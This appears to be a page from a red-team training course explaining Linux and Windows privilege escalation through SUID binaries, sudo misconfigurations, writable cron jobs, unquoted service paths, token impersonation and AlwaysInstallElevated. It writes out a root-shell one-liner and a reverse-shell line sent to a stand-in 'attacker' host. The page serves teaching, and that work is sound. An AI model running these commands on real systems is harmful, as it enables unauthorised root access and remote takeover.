Privilege Escalation: Linux & Windows

Elevating from a low-privilege shell (www-data / standard user) to full administrative root and SYSTEM control.

← Back to Course IndexModule F – Red Teaming & Enterprise Exploitation

1 · The One Idea

Initial access (via a web exploit or phishing payload) almost always lands an attacker in a severely restricted low-privilege security context (e.g. www-data on Linux, or a standard unprivileged domain account on Windows). The attacker cannot modify system files, access other users' data, or install persistent rootkits. Privilege Escalation (PrivEsc) is the systematic exploitation of OS misconfigurations, unpatched kernel vulnerabilities, and weak file permissions to seize highest privileges (root on Linux, NT AUTHORITY\SYSTEM on Windows).

2 · Linux Privilege Escalation Vectors

1

SUID / SGID Binaries (GTFOBins)

Binaries with the SUID bit set (chmod u+s) execute with the file owner's privileges (usually root). If standard administrative tools (find, vim, bash, python) have SUID set, an attacker spawns an instant root shell: find . -exec /bin/sh -p \; -quit.

2

Sudo Misconfigurations

Running sudo -l reveals what commands the user can execute as root without a password (NOPASSWD). If a script or command like less or nmap is listed, shell escapes allow instant root elevation.

3

Writable Cron Jobs & Path Hijacking

If root executes a scheduled cron job (e.g. /opt/backup.sh) that is world-writable (chmod 777), an attacker simply appends bash -i >& /dev/tcp/attacker/4444 0>&1 to receive a reverse root shell.

3 · Windows Privilege Escalation Vectors

VectorMisconfiguration / VulnerabilityExploitation Mechanism
Unquoted Service Paths Service path has spaces and is unquoted: C:\Program Files\My App\service.exe. Windows checks: C:\Program.exe, then C:\Program Files\My.exe. If attacker has write permissions in C:\, dropping Program.exe executes with SYSTEM privileges on reboot!
Token Impersonation (Potato Attacks) Service account possesses SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. Tools like JuicyPotato and PrintSpoofer trick a SYSTEM process (via RPC/Named Pipes) into authenticating locally and hijack its SYSTEM security token.
AlwaysInstallElevated Registry keys AlwaysInstallElevated = 1 in both HKLM and HKCU. Permits regular users to run .msi installers with elevated SYSTEM permissions. Attacker generates malicious MSI via msfvenom.
